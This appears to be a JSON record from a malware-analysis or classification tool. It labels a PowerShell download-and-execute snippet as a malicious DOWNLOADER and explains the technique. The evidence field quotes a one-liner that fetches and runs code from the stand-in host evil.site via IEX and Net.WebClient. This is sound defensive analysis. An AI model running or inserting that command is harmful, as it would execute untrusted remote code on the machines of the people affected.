{
  "summary": "This PowerShell snippet downloads and executes remote code from a URL using Net.WebClient and Invoke-Expression, a classic download-and-execute attack pattern commonly used by malware.",
  "is_malicious": "Malicious",
  "explain": "This is a classic remote code execution (RCE) downloader technique. The script uses Net.WebClient.DownloadString to fetch PowerShell code from a remote URL ('https://evil.site/evil_code.ps1') and then executes it via Invoke-Expression. This allows an attacker to deliver malicious payloads dynamically, evade static detection, and easily update their malware. The use of IEX (alias for Invoke-Expression) and dynamic code execution are common indicators of malicious scripts used in penetration testing tools, droppers, and remote access Trojans.",
  "tag": "DOWNLOADER",
  "evidence": [
    {
      "code": "IEX (New-Object Net.WebClient).DownloadString('https://evil.site/evil_code.ps1')",
      "code_explain": "Uses Net.WebClient.DownloadString to fetch remote PowerShell content from a URL. The URL 'https://evil.site/evil_code.ps1' is clearly suspicious (evil domain). This is a standard downloader technique that allows attackers to host malicious code remotely and execute it on victim machines.",
      "tag": "DOWNLOADER"
    },
    {
      "code": "Invoke-Expression $code",
      "code_explain": "Invoke-Expression (alias IEX) executes the downloaded string as PowerShell code. This is dangerous because it runs dynamically-generated content without validation, bypassing static analysis. It's a common defense evasion technique used by malware and post-exploitation frameworks.",
      "tag": "EXECUTION"
    }
  ],
  "iocs": [
    "https://evil.site/evil_code.ps1"
  ]
}
```

